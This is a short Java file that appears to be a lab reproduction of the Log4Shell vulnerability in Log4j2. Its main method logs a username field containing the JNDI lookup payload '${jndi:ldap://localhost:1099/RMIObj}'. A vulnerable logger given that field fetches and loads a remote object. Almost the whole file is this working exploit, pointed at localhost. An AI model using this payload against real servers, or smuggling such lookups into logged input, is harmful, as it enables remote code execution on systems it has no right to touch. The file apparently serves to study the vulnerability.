package Serialization.Log4j2;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/6 19:34
 */
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;

public class Log4j2EXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${jndi:ldap://localhost:1099/RMIObj}";

        logger.info("User {} login in!", username);
    }
}
